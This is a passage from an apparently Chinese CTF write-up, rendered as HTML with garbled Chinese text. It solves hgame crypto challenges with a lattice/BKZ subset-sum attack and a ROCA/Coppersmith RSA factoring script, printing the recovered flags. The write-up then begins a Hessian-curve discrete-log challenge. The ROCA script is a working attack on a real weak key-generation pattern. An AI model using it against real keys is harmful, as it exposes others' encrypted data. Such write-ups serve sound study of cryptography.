class="hljs-number">3453019013</span>, <span class="hljs-number">3817650721</span>, <span class="hljs-number">2357302273</span>, <span class="hljs-number">3522135839</span>, <span class="hljs-number">2997389687</span>, <span class="hljs-number">3344465713</span>, <span class="hljs-number">2223415097</span>, <span class="hljs-number">2327459153</span>, <span class="hljs-number">3383532121</span>, <span class="hljs-number">3960285331</span>, <span class="hljs-number">3287780827</span>, <span class="hljs-number">4227379109</span>, <span class="hljs-number">3679756219</span>, <span class="hljs-number">2501304959</span>, <span class="hljs-number">4184540251</span>, <span class="hljs-number">3918238627</span>, <span class="hljs-number">3253307467</span>, <span class="hljs-number">3543627671</span>, <span class="hljs-number">3975361669</span>, <span class="hljs-number">3910013423</span>, <span class="hljs-number">3283337633</span>, <span class="hljs-number">2796578957</span>, <span class="hljs-number">2724872291</span>, <span class="hljs-number">2876476727</span>, <span class="hljs-number">4095420767</span>, <span class="hljs-number">3011805113</span>, <span class="hljs-number">2620098961</span>], [<span class="hljs-number">2844773681</span>, <span class="hljs-number">3852689429</span>, <span class="hljs-number">4187117513</span>, <span class="hljs-number">3608448149</span>, <span class="hljs-number">2782221329</span>, <span class="hljs-number">4100198897</span>, <span class="hljs-number">3705084667</span>, <span class="hljs-number">2753126641</span>, <span class="hljs-number">3477472717</span>, <span class="hljs-number">3202664393</span>, <span class="hljs-number">3422548799</span>, <span class="hljs-number">3078632299</span>, <span class="hljs-number">3685474021</span>, <span class="hljs-number">3707208223</span>, <span class="hljs-number">2626532549</span>, <span class="hljs-number">3444664807</span>, <span class="hljs-number">4207188437</span>, <span class="hljs-number">3422586733</span>, <span class="hljs-number">2573008943</span>, <span class="hljs-number">2992551343</span>, <span class="hljs-number">3465105079</span>, <span class="hljs-number">4260210347</span>, <span class="hljs-number">3108329821</span>, <span class="hljs-number">3488033819</span>, <span class="hljs-number">4092543859</span>, <span class="hljs-number">4184505881</span>, <span class="hljs-number">3742701763</span>, <span class="hljs-number">3957436129</span>, <span class="hljs-number">4275123371</span>, <span class="hljs-number">3307261673</span>, <span class="hljs-number">2871806527</span>, <span class="hljs-number">3307283633</span>, <span class="hljs-number">2813167853</span>, <span class="hljs-number">2319911773</span>, <span class="hljs-number">3454612333</span>, <span class="hljs-number">4199830417</span>, <span class="hljs-number">3309047869</span>, <span class="hljs-number">2506520867</span>, <span class="hljs-number">3260706133</span>, <span class="hljs-number">2969837513</span>, <span class="hljs-number">4056392609</span>, <span class="hljs-number">3819612583</span>, <span class="hljs-number">3520501211</span>, <span class="hljs-number">2949984967</span>, <span class="hljs-number">4234928149</span>, <span class="hljs-number">2690359687</span>, <span class="hljs-number">3052841873</span>, <span class="hljs-number">4196264491</span>, <span class="hljs-number">3493099081</span>, <span class="hljs-number">3774594497</span>, <span class="hljs-number">4283835373</span>, <span class="hljs-number">2753384371</span>, <span class="hljs-number">2215041107</span>, <span class="hljs-number">4054564757</span>, <span class="hljs-number">4074850229</span>, <span class="hljs-number">2936529709</span>, <span class="hljs-number">2399732833</span>, <span class="hljs-number">3078232933</span>, <span class="hljs-number">2922467927</span>, <span class="hljs-number">3832061581</span>, <span class="hljs-number">3871240591</span>, <span class="hljs-number">3526620683</span>, <span class="hljs-number">2304071411</span>, <span class="hljs-number">3679560821</span>]]<br>bag=[<span class="hljs-number">123342809734</span>, <span class="hljs-number">118191282440</span>, <span class="hljs-number">119799979406</span>, <span class="hljs-number">128273451872</span>]<br>ciphertext=<span class="hljs-string">b&#x27;\x1d6\xcc&#125;\x07\xfa7G\xbd\x01\xf0P4^Q&quot;\x85\x9f\xac\x98\x8f#\xb2\x12\xf4+\x05`\x80\x1a\xfa !\x9b\xa5\xc7g\xa8b\x89\x93\x1e\xedz\xd2M;\xa2&#x27;</span><br><br>L=Matrix(ZZ,<span class="hljs-number">65</span>,<span class="hljs-number">68</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>    L[i,i]=<span class="hljs-number">2</span><br>    L[i,-<span class="hljs-number">1</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">2</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">3</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">2</span>][-i-<span class="hljs-number">1</span>]<br>    L[i,-<span class="hljs-number">4</span>]=<span class="hljs-built_in">list</span>[<span class="hljs-number">3</span>][-i-<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,:]=<span class="hljs-number">1</span><br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=bag[<span class="hljs-number">0</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">2</span>]=bag[<span class="hljs-number">1</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">3</span>]=bag[<span class="hljs-number">2</span>]<br>L[-<span class="hljs-number">1</span>,-<span class="hljs-number">4</span>]=bag[<span class="hljs-number">3</span>]<br>x=L.BKZ()<br><span class="hljs-built_in">print</span>(x[<span class="hljs-number">0</span>])<br>p=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x[<span class="hljs-number">0</span>][:<span class="hljs-number">64</span>]:<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span>:<br>        p+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        p+=<span class="hljs-string">&#x27;0&#x27;</span><br>p=<span class="hljs-built_in">int</span>(p,<span class="hljs-number">2</span>)<br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(p).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = cipher.decrypt(ciphertext)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#b&#x27;hgame&#123;A_S1mple_Modul@r_Subset_Sum_Problem&#125;\x06\x06\x06\x06\x06\x06&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="3-suprimeRSA"><a href="#3-suprimeRSA" class="headerlink" title="3.suprimeRSA"></a>3.suprimeRSA</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> prime<br><br>FLAG=<span class="hljs-string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>           <span class="hljs-comment">#å·²çŸ¥éƒ¨åˆ†æ˜æ–‡</span><br>e=<span class="hljs-number">0x10001</span>                                   <span class="hljs-comment">#e=65537</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">primorial</span>(<span class="hljs-params">num</span>):                         <span class="hljs-comment">#primorialçš„æ„æ€æ˜¯æ‰€æœ‰å°äºæˆ–ç­‰äºæŸä¸ªç»™å®šç´ æ•°çš„ç´ æ•°çš„ä¹˜ç§¯ã€‚</span><br>    result = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, num + <span class="hljs-number">1</span>):<br>        result *= prime(i)<br>    <span class="hljs-keyword">return</span> result<br>M=primorial(random.choice([<span class="hljs-number">39</span>,<span class="hljs-number">71</span>,<span class="hljs-number">126</span>]))     <span class="hljs-comment">#M=å°äºç­‰äº39ï¼Œ71ï¼Œ126ä¸­éšæœºä¸€ä¸ªæ•°çš„ç´ æ•°çš„ä¹˜ç§¯</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        k = getPrime(random.randint(<span class="hljs-number">20</span>,<span class="hljs-number">40</span>)) <span class="hljs-comment">#20 &lt;= k &lt;= 40</span><br>        a = getPrime(random.randint(<span class="hljs-number">20</span>,<span class="hljs-number">60</span>)) <span class="hljs-comment">#20 &lt;= k &lt;= 60</span><br>        p = k * M + <span class="hljs-built_in">pow</span>(e, a, M)            <span class="hljs-comment">#p=kM + 65537^a mod M</span><br>        <span class="hljs-keyword">if</span> isPrime(p):                      <span class="hljs-comment">#ç¡®ä¿pæ˜¯ç´ æ•°</span><br>            <span class="hljs-keyword">return</span> p<br><br>p,q=gen_key(),gen_key()<br>n=p*q<br>m=bytes_to_long(FLAG)           <br>enc=<span class="hljs-built_in">pow</span>(m,e,n)                              <span class="hljs-comment">#ç®€å•RSA</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;n=&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;enc=&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n=787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span><br><span class="hljs-string">enc=365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong></p><p>å¯ä»¥çœ‹åˆ°$p&#x3D;kM+65537^a \mod M$,å…¶ä¸­MÂ æ˜¯å‰Â nÂ ä¸ªè¿ç»­ç´ æ•°çš„ä¹˜ç§¯ï¼ŒnÂ æ˜¯ä»…å–å†³äºæ‰€éœ€å¯†é’¥å¤§å°çš„å¸¸æ•°ï¼Œè¿™ç§ç´ æ•°ç”Ÿæˆå½¢å¼ä¼šå—åˆ°<strong>ROCAæ”»å‡»</strong>ã€‚</p><p>æˆ‘è¿™é‡Œç›´æ¥ä½¿ç”¨ROCAçš„sagemathè„šæœ¬è¿›è¡Œè§£ç­”ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨necaå·¥å…·ã€‚</p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">## Coppersmith-howgrave</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">coppersmith_howgrave</span>(<span class="hljs-params">f, N, beta, m, t, R</span>):<br>    <span class="hljs-comment">#Check if parameters are within bounds</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> &lt; beta &lt;= <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;beta not in (0, 1]&#x27;</span><br>    <span class="hljs-keyword">assert</span> f.is_monic(), <span class="hljs-string">&#x27;f is not monic&#x27;</span><br><br>    <span class="hljs-comment">#get delta and the matrix dimension</span><br>    delta = f.degree()<br>    n = delta * m + t<br><br>    <span class="hljs-comment">#Building the polynomials</span><br>    fZ = f.change_ring(ZZ) <span class="hljs-comment">#change the ring from Zmod(N) to ZZ</span><br>    x = fZ.parent().gen()  <span class="hljs-comment">#make x a variable in ZZ</span><br>    f_list = [] <br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(delta):<br>            <span class="hljs-comment">#We want them ordered that&#x27;s we have N^(m-ii1) and fZ^ii</span><br>            f_list.append(((x*R)^j) * N^(m-ii) * fZ(x*R)^(ii)) <span class="hljs-comment">#the g_&#123;i,j&#125;</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>        f_list.append((x*R)^ii * fZ(x*R)^m) <span class="hljs-comment">#the h_i</span><br><br>    <span class="hljs-comment">#Build the lattice</span><br>    B = matrix(ZZ, n) <span class="hljs-comment"># n = delta * m + t</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii+<span class="hljs-number">1</span>):<br>            B[ii, j] = f_list[ii][j]<br><br>    <span class="hljs-comment">#LLL it</span><br>    B_lll = B.LLL(early_red = <span class="hljs-literal">True</span>, use_siegel = <span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment">#take the shortest vector to construct our new poly g</span><br>    g = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        g += x^ii * B_lll[<span class="hljs-number">0</span>, ii] / R^ii<br><br>    <span class="hljs-comment">#factor the polynomial</span><br>    potential_roots = g.roots()<br>    <span class="hljs-comment">#print(&#x27;potential roots:&#x27;, potential_roots)</span><br><br>    <span class="hljs-comment">#we don&#x27;t need to do this Since our we test in our roca function</span><br><span class="hljs-comment">#     #test roots</span><br><span class="hljs-comment">#     roots = []</span><br><span class="hljs-comment">#     for r in potential_roots:</span><br><span class="hljs-comment">#         if r[0].is_integer():</span><br><span class="hljs-comment">#             res = fZ(ZZ(r[0]))</span><br><span class="hljs-comment">#             if gcd(N, res) &gt;= N^beta:</span><br><span class="hljs-comment">#                 roots.append(ZZ(r[0]))</span><br>    <span class="hljs-comment">#print(&#x27;roots:&#x27;, roots)</span><br>    <span class="hljs-keyword">return</span> potential_roots<br>    <span class="hljs-comment">#return roots</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">roca</span>(<span class="hljs-params">N, M_prime, g, m, t, beta</span>):<br>    g = <span class="hljs-built_in">int</span>(g)<br>    c_prime = discrete_log(Zmod(M_prime)(N), Zmod(M_prime)(g))<br>    ord_M_prime = Zmod(M_prime)(g).multiplicative_order()<br><br>    <span class="hljs-comment">#search boundaries</span><br>    bottom = c_prime // <span class="hljs-number">2</span> <br>    top =(c_prime + ord_M_prime) // <span class="hljs-number">2</span> <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;numbers to check&#x27;</span>,   top - bottom, <span class="hljs-string">&#x27; between &#x27;</span>, (bottom, top))<br><br><br>    <span class="hljs-comment">#constants for coppersmith</span><br>    P.&lt;x&gt; = PolynomialRing(Zmod(N))<br>    epsilon = beta / <span class="hljs-number">7</span><br>    X = floor(<span class="hljs-number">2</span> * N^beta / M_prime)<br><br>    <span class="hljs-comment">#the search</span><br>    <span class="hljs-keyword">for</span> i, a <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">range</span>(bottom, top)):<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>: <span class="hljs-comment">#count iterations</span><br>            <span class="hljs-built_in">print</span>(i)<br><br>        <span class="hljs-comment">#construct polynomial</span><br>        f = x + <span class="hljs-built_in">int</span>((inverse_mod(M_prime, N)) * <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(g, a, M_prime)))<br><br>        <span class="hljs-comment">#roots = f.small_roots(X, beta, epsilon) #coppersmith</span><br>        roots = coppersmith_howgrave(f, N, beta, m, t, X)<br>        <span class="hljs-comment">#check solutions</span><br>        <span class="hljs-keyword">for</span> k_prime, _ <span class="hljs-keyword">in</span> roots:<br>            p = <span class="hljs-built_in">int</span>(k_prime * M_prime) + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(g, a, M_prime))<br>            <span class="hljs-keyword">if</span> N % p == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">return</span> p, N//p<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span><br>n=<span class="hljs-number">787190064146025392337631797277972559696758830083248285626115725258876808514690830730702705056550628756290183000265129340257928314614351263713241</span><br>e=<span class="hljs-number">65537</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_M1_m_t_values</span>(<span class="hljs-params">key_size</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;111&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">512</span> &lt;= key_size &lt; <span class="hljs-number">1024</span>:<br>        m = <span class="hljs-number">5</span><br>        M1=<span class="hljs-number">0x1b3e6c9433a7735fa5fc479ffe4027e13bea</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">1024</span> &lt;= key_size &lt; <span class="hljs-number">2048</span>:<br>        m = <span class="hljs-number">4</span><br>        M1=<span class="hljs-number">0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">2048</span> &lt;= key_size &lt; <span class="hljs-number">3072</span>:<br>        m = <span class="hljs-number">6</span><br>        M1=<span class="hljs-number">0x016928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-number">3072</span> &lt;= key_size &lt; <span class="hljs-number">4096</span>:<br>        m = <span class="hljs-number">25</span><br>    <span class="hljs-keyword">else</span>:<br>        m = <span class="hljs-number">7</span><br>    <span class="hljs-keyword">return</span> M1,m, m+<span class="hljs-number">1</span><br>M_prime,m, t = get_M1_m_t_values(<span class="hljs-number">512</span>)<br>p, q = roca(n, M_prime, e, m, t, <span class="hljs-number">.5</span>) <br><span class="hljs-keyword">assert</span>(p*q==n)<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>enc=<span class="hljs-number">365164788284364079752299551355267634718233656769290285760796137651769990253028664857272749598268110892426683253579840758552222893644373690398408</span><br>m=<span class="hljs-built_in">pow</span>(enc,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br><span class="hljs-comment">#b&#x27;hgame&#123;ROCA_ROCK_and_ROll!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="4-Intergalactic-Bound"><a href="#4-Intergalactic-Bound" class="headerlink" title="4.Intergalactic Bound"></a>4.Intergalactic Bound</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_THCurve</span>(<span class="hljs-params">P, Q</span>):  <span class="hljs-comment">#æ›²çº¿åŠ æ³•</span><br>    <span class="hljs-keyword">if</span> P == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> Q<br>    <span class="hljs-keyword">if</span> Q == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> P<br>    x1, y1 = P<br>    x2, y2 = Q<br>    x3 = (x1 - y1 ** <span class="hljs-number">2</span> * x2 * y2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    y3 = (y1 * y2 ** <span class="hljs-number">2</span> - a * x1 ** <span class="hljs-number">2</span> * x2) * <span class="hljs-built_in">pow</span>(a * x1 * y1 * x2 ** <span class="hljs-number">2</span> - y2, -<span class="hljs-number">1</span>, p) % p<br>    <span class="hljs-keyword">return</span> x3, y3<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul_THCurve</span>(<span class="hljs-params">n, P</span>):  <span class="hljs-comment">#æ›²çº¿ä¹˜æ³•</span><br>    R = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            R = add_THCurve(R, P)<br>        P = add_THCurve(P, P)<br>        n = n // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> R<br><br><br>p = getPrime(<span class="hljs-number">96</span>)<br>a = randint(<span class="hljs-number">1</span>, p)<br>G = (randint(<span class="hljs-number">1</span>,p), randint(<span class="hljs-number">1</span>,p))<br>d = (a*G[<span class="hljs-number">0</span>]^<span class="hljs-number">3</span>+G[<span class="hljs-number">1</span>]^<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)%p*inverse(G[<span class="hljs-number">0</span>]*G[<span class="hljs-number">1</span>],p)%p   <span class="hljs-comment">#d=(a * x0^3 + y0^3 + 1)modp * (x0*y0)^-1 modp </span><br>x = randint(<span class="hljs-number">1</span>, p)<br>Q = mul_THCurve(x, G)   <span class="hljs-comment">#Q=x*G</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;G = <span class="hljs-subst">&#123;G&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Q = <span class="hljs-subst">&#123;Q&#125;</span>&quot;</span>)<br><br>key = hashlib.sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()  <span class="hljs-comment">#åˆ†æå¯çŸ¥ï¼Œç›®çš„å°±æ˜¯æ±‚å‡ºx</span><br>cipher = AES.new(key, AES.MODE_ECB)<br>flag = pad(flag,<span class="hljs-number">16</span>)<br>ciphertext = cipher.encrypt(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ciphertext=<span class="hljs-subst">&#123;ciphertext&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">p = 55099055368053948610276786301</span><br><span class="hljs-string">G = (19663446762962927633037926740, 35074412430915656071777015320)</span><br><span class="hljs-string">Q = (26805137673536635825884330180, 26376833112609309475951186883)</span><br><span class="hljs-string">ciphertext=b&quot;k\xe8\xbe\x94\x9e\xfc\xe2\x9e\x97\xe5\xf3\x04&#x27;\x8f\xb2\x01T\x06\x88\x04\xeb3Jl\xdd Pk$\x00:\xf5&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong></p><p>ä¸Šç½‘æœç´¢å¯çŸ¥é“ï¼ŒTHCurveçš„å½¢å¼</p><span>$$ax^3+y^3+1=dxy$$</span><p>é€šè¿‡è”ç«‹ä¸¤ä¸ªç‚¹ï¼Œå¯ä»¥æ±‚å‡ºå‚æ•°<code>a,d</code>ã€‚</p><p>ç„¶åæƒ³åŠæ³•æŠŠæ›²çº¿å’Œç‚¹æ˜ å°„åˆ°æ¤­åœ†æ›²çº¿ä¸Šï¼Œç„¶åè¿›è¡Œç¦»æ•£å¯¹æ•°æ±‚è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-comment">#THCurveæ›²çº¿</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <span class="hljs-number">55099055368053948610276786301</span>       <span class="hljs-comment">#æ¨¡æ•°p</span><br>G = (<span class="hljs-number">19663446762962927633037926740</span>, <span class="hljs-number">35074412430915656071777015320</span>)  <span class="hljs-comment">#å·²çŸ¥ç‚¹G</span><br>Q = (<span class="hljs-number">26805137673536635825884330180</span>, <span class="hljs-number">26376833112609309475951186883</span>)  <span class="hljs-comment">#å·²çŸ¥ç‚¹Q</span><br>ciphertext=<span 